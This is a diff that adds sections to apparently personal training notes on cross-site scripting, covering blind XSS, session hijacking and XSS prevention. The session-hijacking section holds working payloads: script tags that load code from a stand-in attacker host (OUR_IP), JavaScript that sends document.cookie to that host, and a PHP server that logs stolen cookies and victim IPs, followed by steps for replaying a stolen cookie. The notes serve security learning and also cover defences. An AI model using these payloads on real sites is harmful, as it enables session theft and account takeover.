@@ -483,3 +483,204 @@ Create `index.php`:
 - Victim sees a legit-looking login page.
 - Credentials are stored discreetly and attacker gains access.
 
+## Session Hijacking 
+### What it is
+
+- Modern web apps use **cookies** to maintain logged-in sessions.
+- If an attacker obtains a victim’s cookie, they can **reuse it** to impersonate the victim.
+- XSS allows JavaScript to execute in a victim’s browser → **steal cookies remotely**.
+
+### Blind XSS
+
+#### Definition
+
+- XSS that triggers in a location **the attacker cannot see** (e.g., admin panel, reviewer dashboard).
+
+#### Common Blind XSS entry points
+
+- Contact forms
+- Reviews
+- User profile fields
+- Support tickets
+- HTTP headers (e.g., User-Agent)
+
+#### Problem
+
+- You cannot view how the injected payload is rendered.
+
+### Detection Method
+
+#### 1. Load a remote script using the injected field
+
+`<script src="http://OUR_IP/username"></script>`
+
+- Whichever field causes the server to request `/username` reveals the **vulnerable field**.
+    
+#### 2. Test multiple payloads
+
+**Examples:**
+
+`<script src=http://OUR_IP></script> '><script src=http://OUR_IP></script> "><script src=http://OUR_IP></script> javascript:eval('var a=document.createElement("script");a.src="http://OUR_IP";document.body.appendChild(a)') <script>$.getScript("http://OUR_IP")</script>`
+
+#### 3. Run a listener
+
+`sudo php -S 0.0.0.0:80`
+
+### Finding the Vulnerable Field
+
+- Inject remote-script payload **per field**:
+    
+    - `<script src=http://OUR_IP/fullname></script>`
+    - `<script src=http://OUR_IP/username></script>`
+        
+- If server requests `/username`, the **username field is vulnerable**.
+    
+
+### Session Hijacking via XSS
+
+#### JavaScript cookie-stealing payload
+
+Two possible:
+
+`document.location='http://OUR_IP/index.php?c='+document.cookie;`
+
+or:
+
+`new Image().src='http://OUR_IP/index.php?c='+document.cookie;`
+
+- Use the **image payload** (less suspicious).
+    
+
+#### Save as script.js on attacker server:
+
+`new Image().src='http://OUR_IP/index.php?c='+document.cookie;`
+
+#### Inject XSS payload:
+
+`<script src=http://OUR_IP/script.js></script>`
+
+#### Attacker’s Cookie-Capture Server
+
+##### index.php
+
+`<?php if (isset($_GET['c'])) {     $list = explode(";", $_GET['c']);     foreach ($list as $value) {         $cookie = urldecode($value);         $file = fopen("cookies.txt", "a+");         fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");         fclose($file);     } } ?>`
+
+##### Start PHP server
+
+`sudo php -S 0.0.0.0:80`
+
+### Result
+
+- Victim loads admin panel containing attacker’s payload.
+- Browser loads `script.js` and triggers request:
+
+`/index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2`
+
+- Credentials logged in `cookies.txt`.
+    
+
+### Hijacking the Session
+
+1. Visit `/hijacking/login.php`
+2. Open **Storage panel** (Shift+F9)
+3. Add cookie:
+    
+    - **Name:** value before `=`
+    - **Value:** value after `=`
+        
+4. Refresh page → logged in as victim.
+
+## XSS Prevention
+
+### Core Idea
+
+Prevent XSS by securing:
+
+- **Source** (user input)
+- **Sink** (where input is written to the page)
+
+Requires **input validation**, **input sanitization**, **output encoding**, and **secure server configuration**.
+
+### Front-End Prevention
+
+### Input Validation
+
+- Validate formats (e.g., email regex).
+- Reject unexpected formats before submission.
+
+**Example:**
+
+`re.test($("#login input[name=email]").val());`
+
+### Input Sanitization
+
+Use libraries like **DOMPurify** to escape dangerous characters:
+
+`let clean = DOMPurify.sanitize(dirty);`
+
+### Avoid Direct Input in Sensitive Areas
+
+Never place user input inside:
+
+- `<script>`
+- `<style>`
+- HTML attributes
+- HTML comments
+
+Avoid JS/jQuery functions that write raw HTML:
+
+- `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`, `document.domain`
+    
+- jQuery: `html()`, `append()`, `prepend()`, `before()`, `after()`, `replaceWith()`, etc.
+    
+### Back-End Prevention
+
+#### Back-End Validation
+
+Validate input again on server-side (front-end checks are bypassable).  
+Example (PHP):
+
+`filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)`
+
+#### Back-End Sanitization
+
+Escape dangerous characters before processing or storing input.
+
+**Example (PHP):**
+
+`addslashes($_GET['email']);`
+
+**Example (NodeJS):**
+
+`DOMPurify.sanitize(dirty);`
+
+#### Output Encoding
+
+Encode special characters so they display safely in HTML.
+
+**PHP examples:**
+
+`htmlspecialchars(); htmlentities();`
+
+**NodeJS example:**
+
+`encode('<'); // → '&lt;'`
+
+## Server-Side Security Measures
+
+- Use **HTTPS**.
+- Enable **XSS prevention headers**.
+- Use correct **Content-Type** + `nosniff`.
+- **Content-Security-Policy** (`script-src 'self'`) to restrict script execution.
+- **HttpOnly** + **Secure** cookies prevent JS from reading cookies.
+    
+
+A **WAF** or framework-level XSS protections (e.g., ASP.NET) can also block common attack patterns.
+### Final Notes
+
+Even with protections:
+
+- XSS can still slip through.
+- Continuous testing, code review, and validation are essential.
+- Combine **offensive testing** + **defensive coding** for strongest security posture.
+
